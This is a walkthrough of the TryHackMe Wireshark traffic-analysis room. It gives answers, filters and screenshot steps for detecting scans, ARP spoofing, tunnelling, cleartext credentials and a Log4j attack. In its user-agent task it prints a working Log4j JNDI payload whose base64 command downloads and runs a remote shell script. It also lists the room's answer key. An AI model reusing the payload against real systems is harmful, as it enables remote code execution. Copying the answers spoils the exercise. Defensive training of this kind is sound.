<img width="1070" height="173" alt="Screenshot 2025-09-25 at 4 45 16 PM" src="https://github.com/user-attachments/assets/dccd0f10-ebdc-45b6-93d5-2e611e531fad" />

Learn the basics of traffic analysis with Wireshark and how to find anomalies on your network!

Link: https://tryhackme.com/room/wiresharktrafficanalysis
“In this room, we will cover the techniques and key points of traffic analysis with Wireshark and detect suspicious activities. Note that this is the third and last room of the Wireshark room trio, and it is suggested to visit the first two rooms stated below to practice and refresh your Wireshark skills before starting this one.”

“In the first two rooms, we have covered how to use Wireshark and do packet-level searches. Now, it is time to investigate and correlate the packet-level information to see the big picture in the network traffic, like detecting anomalies and malicious activities. For a security analyst, it is vital to stop and understand pieces of information spread in packets by applying the analyst’s knowledge and tool functionality. This room will cover investigating packet-level details by synthesising the analyst knowledge and Wireshark functionality for detecting anomalies and odd situations for a given case.”

Task 2: Nmap Scans
Use the “Desktop/exercise-pcaps/nmap/Exercise.pcapng” file.
What is the total number of the “TCP Connect” scans?

Ans: 1000
<img width="698" height="564" alt="Screenshot 2025-09-25 at 4 48 08 PM" src="https://github.com/user-attachments/assets/e3616045-c771-4ae3-a33b-422c6f2cf4d8" />
Which scan type is used to scan the TCP port 80?

Ans: TCP Connect
<img width="697" height="375" alt="Screenshot 2025-09-25 at 4 48 16 PM" src="https://github.com/user-attachments/assets/012e3948-a94d-41ab-95e6-9f5ba8f19d94" />
How many “UDP close port” messages are there?

Ans: 1083

<img width="697" height="559" alt="Screenshot 2025-09-25 at 4 49 03 PM" src="https://github.com/user-attachments/assets/5a66f9c5-1979-413a-ae94-db4949ba01d6" />
“icmp.type == 3”: This filter matches ICMP packets based on the ICMP type field. ICMP type 3 represents the Destination Unreachable message.

“icmp.code == 3”: This filter matches ICMP packets based on the ICMP code field. ICMP code 3 is a specific code value within the Destination Unreachable message type.

Which UDP port in the 55–70 port range is open?

Ans: 68
<img width="685" height="527" alt="Screenshot 2025-09-25 at 4 49 12 PM" src="https://github.com/user-attachments/assets/a2d05911-f351-4abf-881f-05552b6ff472" />
After filtering out destination ports between 50 and 70, there are fourt ports identified that use udp. But if we analyze the packet details of each icmp packets with a“Destination unreachable”, we will identify that ports 67, 53, and 69 are not open.

Fore example in the second image, the first ICMP error uses the original request from 10.10.60.7:67. The same would be said of the other ICMP errors.

Task 3: ARP Poisoning & Man In The Middle!
Use the “Desktop/exercise-pcaps/arp/Exercise.pcapng” file.
What is the number of ARP requests crafted by the attacker?

Ans: 284

We first need to identify who the attacker is.
<img width="689" height="527" alt="Screenshot 2025-09-25 at 4 50 22 PM" src="https://github.com/user-attachments/assets/c96dbbf4-4012-4352-ad93-ae27402647df" />
We have identified that the attacker has a mac address of “00:0c:29:e2:18:b4"

Let’s now craft a query to filter all ARP requests from the MAC address of the attacker.
<img width="695" height="509" alt="Screenshot 2025-09-25 at 4 50 33 PM" src="https://github.com/user-attachments/assets/d1ef7f6b-411c-4f71-9742-97c8e5042e19" />
What is the number of HTTP packets received by the attacker?

Ans: 90

We will modify the query to filter all http packets received by the attacker.
<img width="691" height="520" alt="Screenshot 2025-09-25 at 4 50 42 PM" src="https://github.com/user-attachments/assets/ebb1389c-345f-4aa5-9cc9-dd8326840c11" />
If we use the IP address of the attacker, no packets will be displayed. However, if we use the spoofed address, we will see some packets.
<img width="676" height="366" alt="Screenshot 2025-09-25 at 4 52 07 PM" src="https://github.com/user-attachments/assets/1e91717d-7a2c-4855-b6b5-47048fb69da5" />
<img width="679" height="372" alt="Screenshot 2025-09-25 at 4 52 15 PM" src="https://github.com/user-attachments/assets/1dcca63b-9780-48f2-9616-900018868cb4" />
What is the number of sniffed username&password entries?

Ans: 6

We first need to identify the login points or URL for authentication.
<img width="673" height="74" alt="Screenshot 2025-09-25 at 4 52 25 PM" src="https://github.com/user-attachments/assets/aa9763fb-e171-4c74-a209-b3ea4132529b" />
We see that the attacker sent a “GET” request to a login page. In the packet details under HTTP, we see the host name hosting the login page. We will apply that as filter.

Press enter or click to view image in full size
<img width="682" height="367" alt="Screenshot 2025-09-25 at 4 52 44 PM" src="https://github.com/user-attachments/assets/35b8bac6-dd58-49b7-bd5b-d8f66913a6ef" />

We will modify the query to filter only “POST” request. We get ten packets.
<img width="675" height="399" alt="Screenshot 2025-09-25 at 4 52 52 PM" src="https://github.com/user-attachments/assets/4971f336-1950-4b04-ac02-df3d5c92e9cb" />
Go through all the packets, and some will contain credentials in the Packet details under the HTML Form URL endoded section. Below is an example.

Press enter or click to view image in full size
<img width="729" height="558" alt="Screenshot 2025-09-25 at 4 52 59 PM" src="https://github.com/user-attachments/assets/7f1a9eed-aacb-46b7-9644-8ae8acb04971" />
 realized soon after I answered the last two questions below that we can modify the filter used to matched any value in that field, excluding empty strings.
 <img width="701" height="537" alt="Screenshot 2025-09-25 at 4 53 08 PM" src="https://github.com/user-attachments/assets/1569facf-20ef-4d4a-859d-fadc34b34d1b" />
What is the password of the “Client986”?

Ans: clientnothere!

From the previous packet, we know that data was captured in the HTML Form URL Encoded section. The Display Filter Expression will help us create a filter that is acceptable to wireshark.
<img width="767" height="469" alt="Screenshot 2025-09-25 at 4 53 16 PM" src="https://github.com/user-attachments/assets/da243267-7222-42ed-b042-bd418f93c585" />
What is the comment provided by the “Client354”?

Ans: Nice work!

Same concept as the previous question. Any comments in the hostname might have been captured.

<img width="679" height="436" alt="Screenshot 2025-09-25 at 4 59 24 PM" src="https://github.com/user-attachments/assets/89cb8358-6ffb-4aa8-8a95-c6d80b211db6" />
Task 4: Identifying Hosts: DHCP, NetBIOS and Kerberos
Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/dhcp-netbios.pcap” file.
What is the MAC address of the host “Galaxy A30”?
Ans: 9a:81:41:cb:96:6c
<img width="611" height="70" alt="Screenshot 2025-09-25 at 4 59 35 PM" src="https://github.com/user-attachments/assets/297c1077-0832-425c-bed6-d93058e343e7" />
How many NetBIOS registration requests does the “LIVALJM” workstation have?

Ans: 16

Let’s create a query using the Display Filter Expression. The first one is building an NBNS registration request filter, and the second one is filtering NBNS names that match only the workstation “LIVALJM”
<img width="682" height="620" alt="Screenshot 2025-09-25 at 4 59 44 PM" src="https://github.com/user-attachments/assets/28d44810-60bc-4e5a-858c-9ec0bb26ebdd" />
<img width="683" height="720" alt="Screenshot 2025-09-25 at 5 00 09 PM" src="https://github.com/user-attachments/assets/5b6c3f64-bcad-49ec-ad68-a7a4aacb1694" />
<img width="678" height="368" alt="Screenshot 2025-09-25 at 5 00 17 PM" src="https://github.com/user-attachments/assets/89d77023-0149-4764-afa4-5a61bb325a40" />
Which host requested the IP address “172.16.13.85”?

Ans: Galaxy-A12
<img width="682" height="280" alt="Screenshot 2025-09-25 at 5 00 26 PM" src="https://github.com/user-attachments/assets/e8502dc7-f81f-4bd4-a53c-0905c67d4b41" />
If the Host Name column is not diplayed as a column, go to the Packet List and right-click to add column for the host name. Otherwise, search for the host name within the DHCP Packet details pane.
<img width="576" height="267" alt="Screenshot 2025-09-25 at 5 00 36 PM" src="https://github.com/user-attachments/assets/0319ce22-cdec-4cd8-9398-b6e3e25addd5" />
Use the “Desktop/exercise-pcaps/dhcp-netbios-kerberos/kerberos.pcap” file.
What is the IP address of the user “u5”? (Enter the address in defanged format.)

Ans: 10[.]1[.]12[.]2
<img width="678" height="502" alt="Screenshot 2025-09-25 at 5 00 47 PM" src="https://github.com/user-attachments/assets/41b6f74e-812e-47da-9a97-bf65bee06da4" />
Defang the IP address uding cyberchef.
<img width="641" height="268" alt="Screenshot 2025-09-25 at 5 00 55 PM" src="https://github.com/user-attachments/assets/69d8e4dc-5862-47cb-bbcf-f30eff3dfc59" />
What is the hostname of the available host in the Kerberos packets?

Ans: xp1$
<img width="687" height="505" alt="Screenshot 2025-09-25 at 5 01 45 PM" src="https://github.com/user-attachments/assets/227722ca-7886-4a55-89ce-9dd105f49792" />

Values that end with “$” are hostnames, and the ones without it are usernames.

Task 5: Tunneling Traffic: DNS and ICMP
Use the “Desktop/exercise-pcaps/dns-icmp/icmp-tunnel.pcap” file.
Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?

Ans: SSH
<img width="683" height="500" alt="Screenshot 2025-09-25 at 5 06 09 PM" src="https://github.com/user-attachments/assets/a5317845-cbd9-41f8-9c01-ac877c6db515" />

The result does not have enough data for us to analyze.

So we will modify the query to include the protocols commonly used for data exfiltration such as SSH, FTP, TCP, and HTTP
<img width="685" height="516" alt="Screenshot 2025-09-25 at 5 06 23 PM" src="https://github.com/user-attachments/assets/900c0cf1-6296-4a57-9882-30b5f7cfaaf6" />
We got three results. Inpect one of the packets and focus on the packet bytes pane.
<img width="675" height="479" alt="Screenshot 2025-09-25 at 5 06 44 PM" src="https://github.com/user-attachments/assets/9cb7561a-0077-461c-a4cb-de6cff3c2dd7" />
The strings on the right-side are commonly associated with SSH protocol negotiation, encryption algorithms, and authentication methods.

Use the “Desktop/exercise-pcaps/dns-icmp/dns.pcap” file.
Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

Ans: dataexfil[.]com
<img width="1358" height="1180" alt="image" src="https://github.com/user-attachments/assets/a8e8da55-6c6c-412f-97ba-62f6fc763ff0" />

We got over 30,000 packets. Imagine going over each one individually

I modified the query and increased the query name length to 40 to look for DNS names with particularly long lngths, which is highly suspicious for a normal DNS name.
<img width="686" height="554" alt="Screenshot 2025-09-25 at 5 07 03 PM" src="https://github.com/user-attachments/assets/046be934-211d-4003-ac11-ce93622a109b" />
We can also use the following query or modify it if we are looking for a specific top-level domain such as “.com”
<img width="689" height="88" alt="Screenshot 2025-09-25 at 5 07 11 PM" src="https://github.com/user-attachments/assets/c8c6f7b9-06e9-459f-b2d3-50830c42430b" />
Task 6: Cleartext Protocol Analysis: FTP
Use the “Desktop/exercise-pcaps/ftp/ftp.pcap” file.
How many incorrect login attempts are there?

Ans: 737
<img width="683" height="509" alt="Screenshot 2025-09-25 at 5 11 33 PM" src="https://github.com/user-attachments/assets/280d2afe-4b01-4ca0-b98a-c4d4f1796d92" />

What is the size of the file accessed by the “ftp” account?

Ans: 39424

<img width="684" height="446" alt="Screenshot 2025-09-25 at 5 11 55 PM" src="https://github.com/user-attachments/assets/f9a0a4e7-cf95-4eb9-9a8a-969d686804a2" />
The ftp.response.code of 213 provides information about the status or size of a downloaded file. The “arg” value contains the readable strings that include file size in bytes.

The adversary uploaded a document to the FTP server. What is the filename?

Ans: resume.doc
<img width="679" height="432" alt="Screenshot 2025-09-25 at 5 12 05 PM" src="https://github.com/user-attachments/assets/116f2529-bfa4-420a-a052-780dcac80225" />

The FTP command “RETR” is used to retrieve (or download) files or documents from the FTP server to our local system.

Not sure if the question meant to ask about uploading documents to the FTP server because the ftp command for that is “STOR” and the uploaded file was different.
<img width="680" height="308" alt="Screenshot 2025-09-25 at 5 12 13 PM" src="https://github.com/user-attachments/assets/de05f32f-5980-445a-b02c-24ccc5821869" />
The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?

Ans: CHMOD 777
<img width="676" height="435" alt="Screenshot 2025-09-25 at 5 12 20 PM" src="https://github.com/user-attachments/assets/d255273f-c846-4ea5-8057-3231fb5f7a4f" />
“CHMOD” is a terminal command used for modifying file permissions using numeric or symbolic representation.

Task 7: Cleartext Protocol Analysis: HTTP
Use the “Desktop/exercise-pcaps/http/user-agent.cap” file.

Investigate the user agents. What is the number of anomalous “user-agent” types?

Ans: 6
<img width="673" height="82" alt="Screenshot 2025-09-25 at 5 12 31 PM" src="https://github.com/user-attachments/assets/bcd73573-724b-4678-9521-bea9bed44478" />
<img width="674" height="635" alt="Screenshot 2025-09-25 at 5 12 44 PM" src="https://github.com/user-attachments/assets/731cace6-8def-40ac-b11b-ebc54d1a01ba" />
Filter packets with HTTP user-agent. Select one of the packets and apply the “User-Agent” info as a column. We have to go through each of the “User-Agent” columns and idenify the legitimate and elligitimate ones.

The hint actually gave us the first user-agent.

Mozilla/5.0 (Windows; U; Windows NT 6.4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.237 Safari/534.10
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Wfuzz/2.4
sqlmap/1.4#stable (http://sqlmap.org)
${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
What is the packet number with a subtle spelling difference in the user agent field?

Ans: 52
<img width="673" height="45" alt="Screenshot 2025-09-25 at 5 12 55 PM" src="https://github.com/user-attachments/assets/8e1f6f8e-b9d1-4ec3-96d4-1873b9e0ddd3" />
This is a needle in a hay stack because at first glance, nothing seems suspicious.

Use the “Desktop/exercise-pcaps/http/http.pcapng” file.
Locate the “Log4j” attack starting phase. What is the packet number?

Ans: 444

With this task, we will be able to answer the last two questions.
<img width="681" height="547" alt="Screenshot 2025-09-25 at 5 13 04 PM" src="https://github.com/user-attachments/assets/ddf437b0-30ae-4e56-bea3-21b95d0af289" />
<img width="681" height="78" alt="Screenshot 2025-09-25 at 5 13 13 PM" src="https://github.com/user-attachments/assets/8bdb9301-e387-42f3-ae58-3ae902c09b75" />
Copy the value of the User-Agent then decode it from base 64 using cyberchef.
<img width="679" height="185" alt="Screenshot 2025-09-25 at 5 13 21 PM" src="https://github.com/user-attachments/assets/22d78678-2f8c-4731-b2fa-ad8bcb675220" />
This is the attack starting phase as seen from the decoded command. The command “wget” would retreive the bash script “lh.sh” from the hosting address, then change the file’s permission to executable, then eventually executing the malicious file.

Locate the “Log4j” attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude “{}”.)

Ans: 62[.]210[.]130[.]250
Task 8: Encrypted Protocol Analysis: Decrypting HTTPS
Use the “Desktop/exercise-pcaps/https/Exercise.pcap” file.

What is the frame number of the “Client Hello” message sent to “accounts.google.com”?

Ans: 16
<img width="698" height="576" alt="Screenshot 2025-09-25 at 5 19 56 PM" src="https://github.com/user-attachments/assets/44afc8d4-c62f-419a-8141-0100209f2f6f" />
“tls.handshake.type == 1” filters TLS requests sent by a client to a server.

Decrypt the traffic with the “KeysLogFile.txt” file. What is the number of HTTP2 packets?

Ans: 115

Adding the key log file: “Edit → Preferences → Protocols → TLS” menu. Then filter only http2 packets.
<img width="676" height="457" alt="Screenshot 2025-09-25 at 5 20 10 PM" src="https://github.com/user-attachments/assets/0867f59d-7baf-4238-8b8c-69baf2eda557" />
<img width="675" height="396" alt="Screenshot 2025-09-25 at 5 20 18 PM" src="https://github.com/user-attachments/assets/47b56539-171f-4938-a3b0-25350414162c" />

Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)

Ans: safebrowsing[.]googleapis[.]com

Press ctrl+g and go to packet 322.

Press enter or click to view image in full size
<img width="677" height="409" alt="Screenshot 2025-09-25 at 5 26 59 PM" src="https://github.com/user-attachments/assets/615e38b5-284b-4989-92f0-70a7c819c253" />
<img width="628" height="432" alt="Screenshot 2025-09-25 at 5 27 08 PM" src="https://github.com/user-attachments/assets/6340f446-bf9f-4ced-8485-f105eb93ec19" />
In the packet details pane, we see the header authority. Defang the address in cyberchef.

<img width="676" height="284" alt="Screenshot 2025-09-25 at 5 27 16 PM" src="https://github.com/user-attachments/assets/ac55a0f2-46fc-4c2b-9bda-f896e0f92f2e" />
Investigate the decrypted packets and find the flag! What is the flag?

Ans: FLAG{THM-PACKETMASTER}

In the export HTTP object list window, there are two files, and one of which is kind of suspicious. So let’s go to the packet number and see what it is.

Press enter or click to view image in full size
<img width="687" height="422" alt="Screenshot 2025-09-25 at 5 27 26 PM" src="https://github.com/user-attachments/assets/d83af7ca-251c-4ace-9d7f-ce5593d1b8f9" />

The flag can be seen in the Line-based text data section of the packet details pane.

Task 9 Bonus: Hunt Cleartext Credentials!
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.

What is the packet number of the credentials using “HTTP Basic Auth”?

Ans: 237
<img width="703" height="542" alt="Screenshot 2025-09-25 at 5 36 15 PM" src="https://github.com/user-attachments/assets/06ae9b80-123f-439a-b441-cc206a5c9745" />
What is the packet number where “empty password” was submitted?

Ans: 170
<img width="680" height="444" alt="Screenshot 2025-09-25 at 5 36 23 PM" src="https://github.com/user-attachments/assets/be18e269-0bc5-43cc-9258-7888bb84d597" />
If we click on the packet number in the credentials window, wireshark directs us to the packet as seen from the image above.

Browse through the packets. Packet 170 has no value in the Request arg.
<img width="678" height="366" alt="Screenshot 2025-09-25 at 5 36 33 PM" src="https://github.com/user-attachments/assets/a17f5b8e-c2e4-43e3-a842-8fe87fabc859" />
Another way to look for empty credentials submission for FTP packets is to select one of the packets where authentication is being requested. Select the “Request command: PASS” from the packet details, then left-click it and drag all the way to the display filter, or simply by right-clicking and applying it as a display filter.
<img width="684" height="366" alt="Screenshot 2025-09-25 at 5 36 43 PM" src="https://github.com/user-attachments/assets/0d51324f-55f0-4ac0-ba48-ed2741c3014f" />
<img width="675" height="369" alt="Screenshot 2025-09-25 at 5 36 51 PM" src="https://github.com/user-attachments/assets/4db83ac3-8c18-41de-99bb-41278045261f" />
The result will display all ftp packets that requested for a “PASS” command in the authentication.

Task 10 Bonus: Actionable Results!
Use the “Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap” file.

Create firewall rules by using “Tools → Firewall ACL Rules”

Select packet number 99. Create a rule for “IPFirewall (ipfw)”. What is the rule for “denying source IPv4 address”?

Change the rules for “IPFirewall(ipfw)”
<img width="650" height="483" alt="Screenshot 2025-09-25 at 5 37 03 PM" src="https://github.com/user-attachments/assets/098e1aed-f2b7-45d5-85d1-e1326f98dc9b" />
Ans: add deny ip from 10.121.70.151 to any in

Select packet number 231. Create “IPFirewall” rules. What is the rule for “allowing destination MAC address”?

Ans: add allow MAC 00:d0:59:aa:af:80 any in

Unselect Deny.
<img width="643" height="486" alt="Screenshot 2025-09-25 at 5 37 11 PM" src="https://github.com/user-attachments/assets/1e2d02bc-b87a-4651-b0cd-fb49aada29fc" />


Conclusion

